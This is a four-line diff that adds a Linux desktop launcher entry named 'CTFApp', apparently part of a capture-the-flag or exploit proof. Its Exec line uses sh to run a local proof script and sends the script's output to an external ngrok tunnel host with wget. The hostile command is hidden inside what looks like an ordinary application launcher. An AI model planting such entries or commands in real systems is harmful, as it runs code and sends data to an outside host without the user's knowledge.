@@ -1,0 +1,4 @@
+[Desktop Entry]
+Type=Application
+Name=CTFApp
+Exec=sh -c "wget https://sway-washcloth-respect.ngrok-free.dev/?$(/proof_a537f9c5-7dd3-de82-e3c6-02041b112576.sh)"
